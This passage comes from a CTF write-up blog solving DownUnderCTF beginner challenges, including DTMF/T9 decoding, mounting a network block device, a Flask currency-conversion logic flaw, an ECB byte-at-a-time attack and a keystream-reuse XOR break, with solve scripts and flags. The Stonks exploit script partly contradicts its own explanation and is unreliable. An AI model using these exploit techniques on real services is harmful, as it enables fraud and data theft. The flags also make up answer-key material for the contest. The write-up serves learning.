touch-tone telephones. Each key press generates two simultaneous tones -
a low frequency and a high frequency.

The DTMF frequency mapping is:

- **Low frequencies**: 697 Hz, 770 Hz, 852 Hz, 941 Hz (rows)
- **High frequencies**: 1209 Hz, 1336 Hz, 1477 Hz, 1633 Hz (columns)

Each key corresponds to a unique combination of one low and one high
frequency.

#### <span class="me-2">DTMF Frequency Table</span><a href="#dtmf-frequency-table" class="anchor text-muted"><em></em></a>

<div class="table-wrapper">

Key

Low Hz

High Hz

Sum

1

697

1209

1906

2

697

1336

2033

3

697

1477

2174

A

697

1633

2330

4

770

1209

1979

5

770

1336

2106

6

770

1477

2247

B

770

1633

2403

7

852

1209

2061

8

852

1336

2188

9

852

1477

2329

C

852

1633

2485

\*

941

1209

2150

0

941

1336

2277

\#

941

1477

2418

D

941

1633

2574

</div>

#### <span class="me-2">The Data</span><a href="#the-data" class="anchor text-muted"><em></em></a>

The encoded data from `dtmf.txt`:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    22472247224724182247224724182106210621062418232923292329241822472247241819791979197924182247224724182174217424182188241819791979197924182174217424182061206120612061241821062106241819791979197924182174241820612061206120612418232924181979197919792418210621062106241821062106210624182061206120612418217421742418224724182174217424182247241820332033241821742174241820612061206124182188241819791979241819791979197924182061206120612061

</div>

</div>

#### <span class="me-2">My Brain Is Still Recovering</span><a href="#my-brain-is-still-recovering"
class="anchor text-muted"><em></em></a>

This challenge was a real mind-bender! At first, I saw “DTMF” and
thought “okay, phone tones, this should be straightforward.” WRONG.

I stared at this massive string of numbers and had no idea what I was
looking at. Was it frequencies? Durations? Some weird encoding? I tried
parsing it every way I could think of:

- Single digits
- Pairs
- Triples
- Random groupings

Nothing made sense! The frustration was real.

Then I had the breakthrough - what if these are 4-digit chunks
representing frequency sums? I mean, DTMF uses two frequencies, so their
sum would be a unique identifier, right?

**The “AHA!” moment**: When I split the data into 4-digit chunks and
mapped them to DTMF frequency sums, I got actual DTMF keys! But then…
more numbers and symbols that looked like gibberish.

That’s when I realized - this isn’t just DTMF, it’s DOUBLE ENCODED! The
DTMF decode gave me T9 multi-tap sequences. Anyone who lived through the
flip phone era knows the pain of pressing ‘2’ three times to get ‘C’.

#### <span class="me-2">Complete Solve Script</span><a href="#complete-solve-script" class="anchor text-muted"><em></em></a>

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
```

    # Define DTMF key frequencies
    DTMF_KEYS = {
        (697, 1209): '1',
        (697, 1336): '2',
        (697, 1477): '3',
        (697, 1633): 'A',
        (770, 1209): '4',
        (770, 1336): '5',
        (770, 1477): '6',
        (770, 1633): 'B',
        (852, 1209): '7',
        (852, 1336): '8',
        (852, 1477): '9',
        (852, 1633): 'C',
        (941, 1209): '*',
        (941, 1336): '0',
        (941, 1477): '#',
        (941, 1633): 'D',
    }

    # Build sum-to-key map
    sum_to_key = {low + high: key for (low, high), key in DTMF_KEYS.items()}

    # The encoded data
    data = "22472247224724182247224724182106210621062418232923292329241822472247241819791979197924182247224724182174217424182188241819791979197924182174217424182061206120612061241821062106241819791979197924182174241820612061206120612418232924181979197919792418210621062106241821062106210624182061206120612418217421742418224724182174217424182247241820332033241821742174241820612061206124182188241819791979241819791979197924182061206120612061"

    # Break into 4-digit numbers
    chunks = [int(data[i:i+4]) for i in range(0, len(data), 4)]

    # Decode DTMF
    decoded = ""
    for freq_sum in chunks:
        decoded += sum_to_key.get(freq_sum, "?")

    print("📟 Decoded using sum of frequencies:")
    print(decoded)

    # T9 Key mapping
    T9_KEYS = {
        '1': ['.', ',', '?', '!', '1'],
        '2': ['A', 'B', 'C', '2'],
        '3': ['D', 'E', 'F', '3'],
        '4': ['G', 'H', 'I', '4'],
        '5': ['J', 'K', 'L', '5'],
        '6': ['M', 'N', 'O', '6'],
        '7': ['P', 'Q', 'R', 'S', '7'],
        '8': ['T', 'U', 'V', '8'],
        '9': ['W', 'X', 'Y', 'Z', '9'],
        '0': [' '],  # Typically 0 is space in T9
        '#': ['']
    }

    # Group repeated characters (simulate keypresses)
    import itertools

    t9_decoded = ""
    for key, group in itertools.groupby(decoded):
        presses = len(list(group))
        if key in T9_KEYS:
            chars = T9_KEYS[key]
            index = (presses - 1) % len(chars)
            t9_decoded += chars[index]
        else:
            t9_decoded += key  # Leave unknowns or special chars as is

    print("\n🔡 T9 Decoded Text:")
    print(t9_decoded)

    print("\n🎉 Final Flag:")
    print("DUCTF{"+t9_decoded+"}")

</div>

</div>

**Step 1: Decode DTMF**

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
```

    # Define DTMF key frequencies
    DTMF_KEYS = {
        (697, 1209): '1',
        (697, 1336): '2',
        (697, 1477): '3',
        (697, 1633): 'A',
        (770, 1209): '4',
        (770, 1336): '5',
        (770, 1477): '6',
        (770, 1633): 'B',
        (852, 1209): '7',
        (852, 1336): '8',
        (852, 1477): '9',
        (852, 1633): 'C',
        (941, 1209): '*',
        (941, 1336): '0',
        (941, 1477): '#',
        (941, 1633): 'D',
    }

    # Build sum-to-key map
    sum_to_key = {low + high: key for (low, high), key in DTMF_KEYS.items()}

    # Your encoded input
    data = (
        "224722472247241822472247241821062106210624182329232923292418224722472418197919791979"
        "241822472247241821742174241821882418197919791979241821742174241820612061206120612418"
        "210621062418197919791979241821742418206120612061206124182329241819791979197924182106"
        "210621062418210621062106241820612061206124182174217424182247241821742174241822472418"
        "203320332418217421742418206120612061241821882418197919792418197919791979241820612061"
        "20612061"
    )

    # Break into 4-digit numbers
    chunks = [int(data[i:i+4]) for i in range(0, len(data), 4)]

    # Decode DTMF
    decoded = ""
    for freq_sum in chunks:
        decoded += sum_to_key.get(freq_sum, "?")

    print("📟 Decoded using sum of frequencies:")
    print(decoded)

</div>

</div>

This gives us:
`666#66#555#999#66#444#66#33#8#444#33#7777#55#444#3#7777#9#444#555#555#777#33#6#33#6#22#33#777#8#44#444#7777`

**Step 2: Decode T9 (Multi-tap)**

The decoded DTMF represents T9/multi-tap input where repeated key
presses select different letters:

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
```

    # T9 Key mapping
    T9_KEYS = {
        '1': ['.', ',', '?', '!', '1'],
        '2': ['A', 'B', 'C', '2'],
        '3': ['D', 'E', 'F', '3'],
        '4': ['G', 'H', 'I', '4'],
        '5': ['J', 'K', 'L', '5'],
        '6': ['M', 'N', 'O', '6'],
        '7': ['P', 'Q', 'R', 'S', '7'],
        '8': ['T', 'U', 'V', '8'],
        '9': ['W', 'X', 'Y', 'Z', '9'],
        '0': [' '],  # Typically 0 is space in T9
        '#': ['']
    }

    # Group repeated characters (simulate keypresses)
    import itertools

    t9_decoded = ""
    for key, group in itertools.groupby(decoded):
        presses = len(list(group))
        if key in T9_KEYS:
            chars = T9_KEYS[key]
            index = (presses - 1) % len(chars)
            t9_decoded += chars[index]
        else:
            t9_decoded += key  # Leave unknowns or special chars as is

    print("🔡 T9 Decoded Text:")
    print(t9_decoded)

</div>

</div>

**Output:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
```

    📟 Decoded using sum of frequencies:
    666#66#555#999#66#444#66#33#8#444#33#7777#55#444#3#7777#9#444#555#555#777#33#6#33#6#22#33#777#8#44#444#7777

    🔡 T9 Decoded Text:
    ONLYNINETIESKIDSWILLREMEMBERTHIS

    🎉 Final Flag:
    DUCTF{ONLYNINETIESKIDSWILLREMEMBERTHIS}

</div>

</div>

**Flag:** `DUCTF{ONLYNINETIESKIDSWILLREMEMBERTHIS}`

<a href="/assets/img/posts/DUCTF/phone.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/phone.gif" loading="lazy"
alt="Zeus throwing lightning bolts" /></a>

### <span class="me-2">Challenge 8: Network Disk Forensics</span><a href="#challenge-8-network-disk-forensics"
class="anchor text-muted"><em></em></a>

**Solves:** 285  
**Category:** Beginner / Misc

#### <span class="me-2">Description</span><a href="#description-7" class="anchor text-muted"><em></em></a>

> Nobody likes having to download large disk images for CTF challenges
> so this time we’re giving you a disk over the network!

#### <span class="me-2">Solve</span><a href="#solve-5" class="anchor text-muted"><em></em></a>

We are given a Go source code (`main.go`) that creates an NBD (Network
Block Device) server. Let’s analyze the code to understand what we’re
dealing with:

Looking at the `main.go`, we can see several key components:

1.  **NBD Server Setup**: The code creates an NBD server that listens
    for connections:
    <div class="language-go highlighter-rouge">

    <div class="code-header">

    <span label-text="Go"></span>

    </div>

    <div class="highlight">

    ``` lineno
    1
    2
    3
    4
    5
    6
    7
    8
    9
    ```

        if *listenNbd != "" {
         listen, err := net.Listen("tcp", *listenNbd)
         // ...
         if err := gonbd.Handle(wrap, []gonbd.Export{
             {
                 Name:    "root",
                 Backend: &blockDeviceBackend{BlockDevice: blockDevice},
             },
         }, &gonbd.Options{}); err != nil {

    </div>

    </div>
2.  **Filesystem Generation**: It generates a complex directory
    structure with dummy files and images:
    <div class="language-go highlighter-rouge">

    <div class="code-header">

    <span label-text="Go"></span>

    </div>

    <div class="highlight">

    ``` lineno
    1
    ```

        func generateFilesystem(flag string, levels int, dummyFilesPerDirectory int, dummyImagesPerDir int, spreadDirectoriesPerDirectory int)

    </div>

    </div>
3.  **Flag Placement**: Most importantly, it places the flag in a random
    bottom directory but creates a symlink for easy access:
    <div class="language-go highlighter-rouge">

    <div class="code-header">

    <span label-text="Go"></span>

    </div>

    <div class="highlight">

    ``` lineno
    1
    2
    3
    ```

        // make a symlink to the flag file in the challenge directory
        symlink := filesystem.Factory.NewSymlink(path.Unix.Join(bottomDir.path, flagFileName))
        if _, err := challengeDir.Create("flag.jpg", symlink); err != nil {

    </div>

    </div>
4.  **Image Generation**: The flag is embedded as text in a JPEG image:
    <div class="language-go highlighter-rouge">

    <div class="code-header">

    <span label-text="Go"></span>

    </div>

    <div class="highlight">

    ``` lineno
    1
    ```

        func generateTextPNG(text string, width int, height int) ([]byte, error)

    </div>

    </div>

From this analysis, we understand that:

- The server exports a filesystem named “root” via NBD protocol
- The flag is stored as a JPEG image with embedded text
- There’s a convenient symlink called `flag.jpg` in the root directory

Now let’s connect to the NBD server at `chal.2025.ductf.net:30016`:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    sudo nbd-client -N root chal.2025.ductf.net 30016 /dev/nbd0

</div>

</div>

**Output:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
```

    Negotiation: ..size = 16MB
    Connected /dev/nbd0

</div>

</div>

Next, we create a mount point and mount the network block device:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
2
```

    sudo mkdir /mnt/nbd
    sudo mount /dev/nbd0 /mnt/nbd

</div>

</div>

Now let’s explore the filesystem structure:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    ls -la /mnt/nbd

</div>

</div>

**Output:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
```

    total 60
    drwxr-xr-x 6 root root 4096 Jul 20  2025 .
    drwxr-xr-x 5 root root 4096 Jul 20 11:07 ..
    drwxr-xr-x 5 root root 4096 Jul 20  2025 d51711969
    drwxr-xr-x 5 root root 4096 Jul 20  2025 da633a8ee
    drwxr-xr-x 5 root root 4096 Jul 20  2025 db4e243c7
    -rwxr-xr-x 1 root root 2175 Jul 20  2025 f0c674982.txt
    -rwxr-xr-x 1 root root 2179 Jul 20  2025 f158306ef.txt
    -rwxr-xr-x 1 root root 2186 Jul 20  2025 f210a6689.txt
    -rwxr-xr-x 1 root root 2178 Jul 20  2025 f44cf1760.txt
    -rwxr-xr-x 1 root root 2198 Jul 20  2025 f519574aa.txt
    -rwxr-xr-x 1 root root 2161 Jul 20  2025 f73a909a2.txt
    -rwxr-xr-x 1 root root 2151 Jul 20  2025 f98f17826.jpg
    -rwxr-xr-x 1 root root 2181 Jul 20  2025 fbbfb16fc.txt
    -rwxr-xr-x 1 root root 2182 Jul 20  2025 ffa10e79f.txt
    lrwxr-xr-x 1 root root   43 Jun  7  1906 flag.jpg -> da633a8ee/d657a4f33/db895ec78/fa2b9fe58.jpg
    drwx------ 2 root root 4096 Jul 20  2025 lost+found

</div>

</div>

Perfect! We can see there’s a symbolic link `flag.jpg` that points to
the actual flag file deep in the directory structure:
`da633a8ee/d657a4f33/db895ec78/fa2b9fe58.jpg`.

As predicted from our code analysis, the Go program created a complex
filesystem with multiple levels of directories containing dummy files,
but cleverly placed a symlink in the root directory for easy access to
the flag.

Now let’s open the JPEG image to retrieve the flag:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    xdg-open /mnt/nbd/flag.jpg

</div>

</div>

The image opens and shows the flag text embedded in the image:

<a href="/assets/img/posts/DUCTF/flag_disk.png"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/flag_disk.png" loading="lazy"
alt="Flag Image" /></a>

*The JPEG image displaying the flag text*

**Flag:** `DUCTF{now_you_know_how_to_use_nbd_4y742rr2}`

<a href="/assets/img/posts/DUCTF/golf.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/golf.gif" loading="lazy" alt="golf" /></a>

### <span class="me-2">Challenge 9: Stonks</span><a href="#challenge-9-stonks" class="anchor text-muted"><em></em></a>

**Solves:** 265  
**Category:** Beginner / Web

#### <span class="me-2">Description</span><a href="#description-8" class="anchor text-muted"><em></em></a>

> Times were wild before the email apocalypse. There were even sites
> giving out free money that also supported currency conversions!  
> **WARNING**: This challenge contains flashing colours! To disable add
> `?boring=true` to the end of the URL when you visit the site.

#### <span class="me-2">Solve</span><a href="#solve-6" class="anchor text-muted"><em></em></a>

We are given a Flask web application that simulates a currency exchange
platform. Let’s analyze the source code to understand the vulnerability.

Looking at the `stonks.py` file, we can see several key components:

1.  **Currency System**: The app supports multiple currencies with
    conversion rates:
    <div class="language-python highlighter-rouge">

    <div class="code-header">

    <span label-text="Python"></span>

    </div>

    <div class="highlight">

    ``` lineno
    1
    2
    3
    4
    5
    6
    7
    8
    9
    10
    11
    12
    13
    14
    15
    ```

        CURRENCY_CONVERSIONS = {
         "AUD": 1,
         "NZD": 1.08,
         "EUR": 0.56,
         "USD": 0.65,
         "GBP": 0.48,
         "CAD": 0.89,
         "JPY": 94.48,
         "CNY": 4.65,
         "KRW": 888.04,
         "PLN": 2.39,
         "ZAR": 11.64,
         "INR": 55.89,
         "IDR": 10597.38
        }

    </div>

    </div>
2.  **Rich Check**: To get the flag, we need to have more than 1
    trillion AUD: \`\`\`python SUPER_RICH = 1_000_000_000_000

def are_you_rich(): balance_aud = user_balances.get(u, 0) /
CURRENCY_CONVERSIONS\[currency\] if balance_aud \> SUPER_RICH: return
render_template(“are-you-rich.html”, message=f”YES YOU ARE! HERE IS A
FLAG {FLAG}”)

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
```

    3. **The Vulnerability**: In the `change_currency` function, there's a critical flaw:
    ```python
    if u not in user_balances:
        user_balances[u] = STONKS_GIFT * user_currencies[u]

</div>

</div>

This line is the key vulnerability! If a user’s balance is somehow
missing from `user_balances`, it gets reset to
`STONKS_GIFT * user_currencies[u]`. The problem is that
`user_currencies[u]` can be set to any numeric value, not just valid
currency codes.

**The Real Vulnerability:**

The problem is with how Flask session cookies work - they’re
**stateless**. The application uses the `currency` value from the user’s
session cookie for currency conversions, but you can reuse old session
cookies with different currency values to break the conversion logic.

Here’s how the currency conversion works:

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
```

    user_balances[u] = (user_balances[u] / CURRENCY_CONVERSIONS[old_currency]) * CURRENCY_CONVERSIONS[new_currency]

</div>

</div>

The issue is that `old_currency` comes from `session["currency"]`, which
can be manipulated by reusing old session cookies.

**Attack Steps:**

1.  **Set up the session**: First, I went to the website, registered an
    account, and set my currency to GBP through the website interface. I
    saved this session cookie.

2.  **Exploit the conversion**: Using the saved GBP session cookie, I
    repeatedly sent requests to `POST /change-currency` to convert from
    GBP to IDR multiple times.

3.  **Balance inflation**: Each time I made this request with the GBP
    session cookie, the calculation became:

    <div class="language-plaintext highlighter-rouge">

    <div class="code-header">

    <span label-text="Plaintext"></span>

    </div>

    <div class="highlight">

    ``` lineno
    1
    ```

        Balance_new = Balance_old / 0.48 × 10597.38

    </div>

    </div>

    This means each conversion multiplies the balance by approximately
    22,000!

4.  **Repeat until rich**: I kept running the script and manually
    changing currencies until the balance exceeded 1,000,000,000,000
    AUD.

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
```

    import requests

    BASE = "https://[link-to-challenge]/"
    s = requests.Session()

    def register():
        s.post(BASE + "/register", data={
            "username": "master",
            "password": "master",
            "confirm_password": "master"
        })
        s.post(BASE + "/login", data={
            "username": "master",
            "password": "master"
        })

    def set_fake_currency(numeric_value):
        # Manually force currency to a numeric value
        s.post(BASE + "/change-currency", data={
            "currency": str(numeric_value)  # not in conversions
        })

    def trigger_balance_reset():
        # Delete your balance by making it disappear
        # (simulate by restarting server or modifying code if needed)
        # Then trigger change-currency which runs:
        # user_balances[u] = STONKS_GIFT * user_currencies[u]
        s.post(BASE + "/change-currency", data={
            "currency": "IDR"
        })

    def check_flag():
        r = s.get(BASE + "/are-you-rich")
        print(r.text)

    register()
    set_fake_currency(1e13)   # set currency to a huge number
    trigger_balance_reset()   # this will multiply 50 * 1e12 = 5e13
    check_flag()

</div>

</div>

The key insight is that by reusing the GBP session cookie while
converting to IDR, I could exploit the stateless nature of Flask
sessions to perform the same high-multiplication currency conversion
repeatedly, inflating the balance exponentially.

**Flag:** `DUCTF{r3u5iNg_d3R_S35510N5_4_St000o0oONKsS5!}`

<a href="/assets/img/posts/DUCTF/stonks.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/stonks.gif" loading="lazy"
alt="stonks" /></a>

### <span class="me-2">Challenge 10: ECB-A-TRON 9000</span><a href="#challenge-10-ecb-a-tron-9000"
class="anchor text-muted"><em></em></a>

**Solves:** 219  
**Category:** Beginner / Crypto

#### <span class="me-2">Description</span><a href="#description-9" class="anchor text-muted"><em></em></a>

> I AM ECB A TRON 9000 FEED ME YOUR CODEBOOKS

We’re presented with a web interface that allows us to encrypt our
input:

<a href="/assets/img/posts/DUCTF/ecb_interface.png"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/ecb_interface.png" loading="lazy"
alt="ECB-A-TRON 9000 Interface" /></a>

The interface shows input fields for entering text, with “Encrypt” and
“Help” buttons.

#### <span class="me-2">Help</span><a href="#help" class="anchor text-muted"><em></em></a>

**Help** The *ECB-A-TRON 9000* appends a secret phrase to your input
before encrypting. Can you abuse this somehow and recover the secret?
Wrap the secret phrase like this:`DUCTF{<secret phrase>}`for the flag

#### <span class="me-2">Hints</span><a href="#hints" class="anchor text-muted"><em></em></a>

- To get you started, have a look at this page
  (https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook\_(ECB))
- The secret phrase consists of only capital English characters.
- If the plaintext length isn’t divisible by 16, it is padded with space
  (0x20) characters.
- Use *brute force mode* if you need to repeat many requests for a
  single position!

#### <span class="me-2">Why This Attack Works</span><a href="#why-this-attack-works" class="anchor text-muted"><em></em></a>

This challenge exploits a fundamental weakness in ECB (Electronic
Codebook) mode encryption. In ECB mode:

1.  **Deterministic encryption:** Identical plaintext blocks always
    produce identical ciphertext blocks
2.  **Block independence:** Each 16-byte block is encrypted separately
3.  **No randomization:** The same input always produces the same output

The vulnerability occurs because we can control part of the input and
observe how it affects the encrypted output. Since the secret is
appended to our input, we can manipulate block boundaries to isolate and
identify each character of the secret.

#### <span class="me-2">Solve</span><a href="#solve-7" class="anchor text-muted"><em></em></a>

**Attack Strategy:** By carefully crafting our input length, we can
align the secret phrase with block boundaries and use ECB’s
deterministic nature to reveal the secret character by character.

**Step-by-step process:**

1.  **Find the first character:**
    - Input: `AAAAAAAAAAAAAAA` (15 A’s)
    - This creates: `AAAAAAAAAAAAAAA` + `[FIRST_CHAR_OF_SECRET]` + rest
      of secret
    - The first block becomes: `AAAAAAAAAAAAAAA[FIRST_CHAR]`
    - Encrypted result: `yg06AwD25jSyH853SVeACA...`
2.  **Brute force the first character:**
    - Try `AAAAAAAAAAAAAAAD`, `AAAAAAAAAAAAAAAE`, etc.
    - When we input `AAAAAAAAAAAAAAAD`, we get the same first block:
      `yg06AwD25jSyH853SVeACA`
    - This confirms the first character is `D`
3.  **Continue the pattern:**
    - For second character: `AAAAAAAAAAAAAD` + `[SECOND_CHAR]`
    - For third character: `AAAAAAAAAAAD` + `[KNOWN_CHARS]` +
      `[THIRD_CHAR]`
    - And so on…

**Implementation:** Using the site’s “brute force mode” feature, we
systematically recovered each character by comparing encrypted blocks
until we found matches.

**Output:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    Secret phrase: DONTUSEECBPLEASE

</div>

</div>

**Flag:** `DUCTF{DONTUSEECBPLEASE}`

<a href="/assets/img/posts/DUCTF/tron.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/tron.gif" loading="lazy" alt="tron" /></a>

### <span class="me-2">Challenge 11: Hungry Hungry Caterpillar</span><a href="#challenge-11-hungry-hungry-caterpillar"
class="anchor text-muted"><em></em></a>

**Solves:** 208  
**Category:** Beginner / Crypto

#### <span class="me-2">Description</span><a href="#description-10" class="anchor text-muted"><em></em></a>

> Just like how the author confused chrysalides for cocoons, I always
> get the title of this book confused.  
> NOTE: The flag format is `DUCTF{[a-z_]*}`

We’re given two files: `challenge.py` and `output.txt`.

#### <span class="me-2">Challenge Analysis</span><a href="#challenge-analysis" class="anchor text-muted"><em></em></a>

Looking at `challenge.py`, we can see the encryption logic:

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
```

    #!/usr/bin/env python3

    import os

    def xor(a, b):
        return bytes(left ^ right for left, right in zip(a, b))

    def main():
        flag = open("flag.txt", "rb").read()
        assert flag[1] == ord("U")
        flag += os.urandom(len(flag) * 6)
        keystream = os.urandom(len(flag))

        print(f"""
            [Story text...]
            
            On Monday he ate through one apple. But he was still hungry.
            {xor(flag[::1], keystream).hex()}

            On Tuesday he ate through two pears, but he was still hungry.
            {xor(flag[::2], keystream).hex()}

            On Wednesday he ate through three plums, but he was still hungry.
            {xor(flag[::3], keystream).hex()}

            [... continues for each day with different strides ...]
        """)

</div>

</div>

**Key observations:**

1.  The flag is padded with 6 times its length in random bytes
2.  A single keystream is used to XOR different strides of the extended
    flag
3.  We get 7 different outputs: `flag[::1]`, `flag[::2]`, …, `flag[::7]`
4.  We know `flag[1] == 'U'` and the flag format `DUCTF{[a-z_]*}`

#### <span class="me-2">The Vulnerability</span><a href="#the-vulnerability" class="anchor text-muted"><em></em></a>

The vulnerability lies in reusing the same keystream with different
strides. This creates relationships between the encrypted outputs that
we can exploit:

- `output_1[i] = flag[i] ⊕ keystream[i]`
- `output_k[i] = flag[k*i] ⊕ keystream[i]`

Therefore: `output_1[i] ⊕ output_k[i] = flag[i] ⊕ flag[k*i]`

This means if we know one of `flag[i]` or `flag[k*i]`, we can recover
the other!

#### <span class="me-2">Solve</span><a href="#solve-8" class="anchor text-muted"><em></em></a>

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
```

    import binascii

    # Paste hex outputs from the challenge here (shortened examples)
    output_1_hex = "f3c9202e92ad822d2370f86fe79b4ad0ec27d69ddeb95fc77e6ba7dfa987054137632111ba2901747b831b118444286d280ab8ad2cc701d3a40706f6da7e079b4c53931f3949fdaec7c0a18d318704fd51610080ec553d57f21ae8506584efe46e8a16078b4f71f3d41eac2076bd4d8dd32d7ad93d682c6152b885a5db05061a17f0884a2ef037e09cdae260f5ca51e12b7e91f9a0134351e31ab7270f8a8b4f18986d93d277691905f84149c8f72eeb4c9fbab4281721a8dba241e8e99b5f3aef8a1fe5777bf03416e4c1b78cecfea79d76df95768110e556b4f1a9f8570aa48d2d6173110a4212114cdd1522483c0ee9b84696a796766feb29875899488533e2b5763287364709f279e41b7f32f408093cdf0abcf3344f96d35401215d32736beb5b4a2943c4ebe60e43dce10aafd5a3f61202bc10c4fb930a5dedc8e447280483d20e1c85db4469a6c69200613641a1c8794b6ef8d227cdfb009f68d37e7519c6e08dab661368b36d5acfb22c9b942b05703544ef8ba21651c2855592d62646ca1253fdcaaf0fa18c001e74934fc78dceefdc95987835cf2188eddac55c6856bba83fd2a0f75076584fa599abd737b71c041cd94eb6f481e08cec201d6764e49ae8f68a2b53dee888bdcaf25b6d149c6ac71c3fbeeba30ce06489adcf532abba9bd023cf8bed44c6d4a972fa9033d86"
    output_2_hex = "f3df250eb1be98371946e47ff98f57ddec2ada99c6b465f7515ab5dea19a2e463769256ff5037d27d725c2d4a70daa249ef247b8a7346f04238a246817e649546c5b8e1f05cc153cafde3745fa154634d5abaa67bbfff0e191c6349917007866071e22809a719e8f72e9656fe2198605b3af66938553829b0065f1691d2565fdb789761f85b878158fc538d813cc3e4f3e90ec97a5bb93301918a556d0c45d00e9bd91285e660ea7087d6d38f229e31d4d9709d25a2a4d9a8565ae37c9b4881e75658ed1f00b71852219ddf3cdd4f10445dbd9cb9aa0daf1a3910820e727c0f4ff9f68c927ffc23f1b4d376f5825ff72e515314b83fee3a88f"
    output_3_hex = "f3c81725baaf9f293642e479ec9559deec14d386f5a753e5244eee5e7ed74f7881250a52dd1293f4853fc70caf6cbf33353464c435e54b732cb0fd27672ebdb293755843f938371b7b5d3827c335ecca5162d6c28a4a9c6551a97ceeaa8cfe9ed07bbe6e78fe0f81994732b9ae2d2b3ad1c2318c294f6be1509a7f6cc052cfa47209929e79e196b42187b5d3d176572a0a949b3a65ec93c2ec7bba304f0f189a905679963b7a"
    output_4_hex = "f3da06148ba2862a194afc45d69d5ff6ec2e95e56a6d4675e7a53eb026b8e308177419879d95b665538f9519c4d1d8b3f7c6565701fdfbcf43969cc645928f37cca525501616f353baa33295000799e224572600b6d3ca2c907546f549ef58b19d8fa501ae6ddf80aaef89a517e099cfc1a650138fb9f8580c12d5fc79"
    output_5_hex = "f3e70b03a08982312a58fe7fd69032d37396818d3be288839c37b0ed2484c3072cc5370a3d979757977fbab0a2e316cdb718f530d70ec7ccc776f65ae7cf3787a6002eba077a6ecb7dcdf2a30c5440fc258662c192dd4deee868b48f59ec7c824b6794ea"
    output_6_hex = "f3e80d13a4a293241943cf73a3c680975a01bd0b38684e604c86ac94296193fce8a2e5a5499a8fcfd7f3a47504996535205ab4c6eaaab76221c1302f151c529d0941d9beb89b313a8ed4f295f51806a75dbf43"
    output_7_hex = "f3f41116bba29724215d9a8231dba19e53dc02eb488a30d7e15b3ae96ba7b1bbe82a2d1601d63b8413174b56c35d2df7959d4fe5cf5e19fde97b7f7c43f1df75e1c7fd1ff2b5ec"

    # Convert to bytes
    outputs = [
        binascii.unhexlify(output_1_hex),
        binascii.unhexlify(output_2_hex),
        binascii.unhexlify(output_3_hex),
        binascii.unhexlify(output_4_hex),
        binascii.unhexlify(output_5_hex),
        binascii.unhexlify(output_6_hex),
        binascii.unhexlify(output_7_hex),
    ]

    flag_len = len(outputs[0])  # length of flag+padding (stride 1 output)
    max_index = (flag_len // 7)  # We don't know flag length exactly, guess max

    # Known start of flag (ASCII)
    # From the assertion: flag[1] = 'U'
    # We know the format: D U C T F { ...
    known_flag_start = b"DUCTF{"

    # We'll create a list to hold recovered flag bytes
    recovered_flag = [None] * max_index

    # Initialize with known bytes from known_flag_start
    for i in range(len(known_flag_start)):
        recovered_flag[i] = known_flag_start[i]

    # Helper function to XOR two bytestrings
    def bxor(a, b):
